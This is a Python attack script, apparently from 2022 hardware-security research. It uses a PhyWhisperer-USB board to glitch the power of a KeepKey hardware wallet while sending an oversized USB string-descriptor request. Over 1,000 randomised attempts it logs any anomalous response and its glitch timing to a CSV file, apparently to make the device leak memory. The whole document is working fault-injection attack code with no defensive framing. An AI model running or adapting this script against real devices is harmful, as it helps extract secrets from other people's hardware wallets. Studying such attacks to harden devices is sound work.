#!/usr/bin/env python3

# emfi 2022

import phywhisperer.usb as pw
import csv
import base64
import random
import pickle
import signal
import uuid
DESC_TYPE_STRING = 0x03

import usb
import usb.core
import usb.util
from sys import hexversion
from usb.control import get_descriptor

def sendRequest():
  d = usb.core.find(idVendor = 0x2b24,idProduct = 0x0001)
  buf = get_descriptor(d,0x0FFE,DESC_TYPE_STRING,d.iProduct,1033)
  return buf

import sys

print("Configuring PhyWhispererUSB")
phy = pw.Usb()
phy.con(program_fpga=True)
phy.load_bitstream("phywhisperer_top.bit")
phy.set_power_source("off")

# pattern_true = [0x00]
pattern_true = [0x80, 0x06, 0x02, 0x03]
print(pattern_true)
# print(pattern)
import time

quietMode = False
oneshot = False

dx = None
# dx = 0.6558979765582688 # usb corruption.
# dx = 0.6519845071548444
# dx = 0.165299
# dx = None
# dx = 0.000245

def sighandler(signum,frame):
  print("Exception handler hit!")
  raise Exception("bye")

signal.signal(signal.SIGALRM,sighandler)

doReset = True

def resetAttackParams():
  phy.reset_fpga()
  phy.set_pattern(pattern=pattern_true,mask=[0xFF for c in pattern_true])
  # phy.set_trigger(num_triggers=2,delays=[1,delay],widths=[5,5])
  phy.set_trigger(num_triggers=1,delays=[delay],widths=[width])
  phy.set_capture_size(256)
  
f_out = open("pop.csv","w")

for i in range(1,1000):
  if dx is None:
    delay = int(random.uniform(10100,10200))
  else:
    delay = phy.ms_trigger(random.uniform(dx * 0.5,dx * 1.01))
  width = random.randint(15,25)
  if doReset:
    phy.set_power_source("off")
    time.sleep(1.0)
    resetAttackParams()
    print("(CYCLE) Preparing for attempt %d, glitch at %f, %d width" % (i,delay,width))
    time.sleep(1.0)
    phy.set_power_source("host")
    time.sleep(3.0)
    doReset = False
  else:
    print("(NOCYCLE) Preparing for attempt %d, glitch at %f, %d width" % (i,delay,width))
    resetAttackParams()
    time.sleep(1.0)
  phy.arm()
  data = ""
  try:
    buf = sendRequest()
  except:
    buf = None
    doReset = True
  if buf is not None:
    blen = buf[0] & 0xfe
    if hexversion >= 0x03020000:
      _name = buf[2:blen].tobytes().decode("utf-16-le")
    else:
      _name = buf[2:blen].tostring().decode("utf-16-le")
    data = _name
    print(data)
    if data != "KeepKey":
      f_out.write(data + ",")
      f_out.write("%d\n" % delay)
      # input("stop here > ")
  else:
    data = ""
    doReset = True
  phy.addpattern = True
  phy.wait_disarmed()
  try:
    raw = phy.read_capture_data()
    packets = phy.split_packets(raw)
    printPackets = pw.USBSimplePrintSink(highspeed=phy.get_usb_mode() == "HS")
    for packet in packets:
      printPackets.handle_usb_packet(ts=packet["timestamp"],buf=bytearray(packet["contents"]),flags=0)
  except:
    print("Critical: failed to do data capture")

f_out.close()
print("Done!")
sys.exit(0)

